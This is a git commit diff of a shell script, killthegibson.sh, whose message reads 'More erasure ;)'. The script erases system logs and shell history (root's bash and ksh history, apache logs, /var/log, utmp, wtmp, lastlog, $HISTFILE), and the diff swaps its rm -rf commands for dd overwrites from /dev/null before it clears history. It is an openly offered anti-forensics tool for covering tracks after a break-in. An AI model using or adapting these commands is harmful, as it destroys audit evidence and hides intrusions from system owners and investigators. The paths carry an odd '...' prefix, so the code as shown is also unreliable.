b79f0dfa8f726ea56133976f001e409849b6ab6f
Mitch \x90 <m0x3957@gmail.com>
2016-05-17 20:42:00 +0100

    Update killthegibson.sh
    More erasure ;)

--- killthegibson.sh
+++ killthegibson.sh
@@ -42,39 +42,39 @@ stty -echo
 echo "*ring ring* 'Hello?'"
 echo "KILL THE GIBSON!!!"
 echo "\!/ TARGETING FILES \!/ "
-rm  -rf .../tmp/logs
+dd if="/dev/null" of=".../tmp/logs"
 echo "Deleted [+].../tmp/logs"
-rm -rf .../root/.bash_history
+dd if="/dev/null" of=".../root/.bash_history"
 echo "Deleted [+].../root/.bash_history"
-rm -rf .../root/.ksh_history
+dd if="/dev/null" of=".../root/.ksh_history"
 echo "Deleted [+].../root/.ksh_history"
-rm -rf .../root/.bash_logout
+dd if="/dev/null" of=".../root/.bash_logout"
 echo "Deleted [+].../root/.bash_logout"
-rm -rf .../usr/local/apache/logs
+dd if="/dev/null" of=".../usr/local/apache/logs"
 echo "Deleted [+].../usr/local/apache/logs"
-rm -rf .../usr/local/apache/log
+dd if="/dev/null" of=".../usr/local/apache/log"
 echo "Deleted [+].../usr/local/apache/log"
-rm -rf .../var/apache/logs
+dd if="/dev/null" of=".../var/apache/logs"
 echo "Deleted [+].../var/apache/logs"
-rm -rf .../var/apache/log
+dd if="/dev/null" of=".../var/apache/log"
 echo "Deleted [+].../var/apache/log"
-rm -rf .../var/run/utmp
+dd if="/dev/null" of=".../var/run/utmp"
 echo "Deleted [+].../var/run/utmp"
-rm -rf .../var/logs
+dd if="/dev/null" of=".../var/logs"
 echo "Deleted [+].../var/logs"
-rm -rf .../var/log
+dd if="/dev/null" of=".../var/log"
 echo "Deleted [+].../var/log"
-rm -rf .../var/adm
+dd if="/dev/null" of=".../var/adm"
 echo "Deleted [+].../var/adm"
-rm -rf .../etc/wtmp
+dd if="/dev/null" of=".../etc/wtmp"
 echo "Deleted [+].../etc/wtmp"
-rm -rf .../etc/utmp
+dd if="/dev/null" of=".../etc/utmp"
 echo "Deleted [+].../etc/utmp"
-rm -rf ...$HISTFILE
+dd if="/dev/null" of="...$HISTFILE"
 echo "Deleted [+]...$HISTFILE"
-rm -rf .../var/log/lastlog
+dd if="/dev/null" of=".../var/log/lastlog"
 echo "Deleted [+].../var/log/lastlog"
-rm -rf .../var/log/wtmp
+dd if="/dev/null" of=".../var/log/wtmp"
 echo "Deleted [+].../var/log/wtmp"
 history -c
 
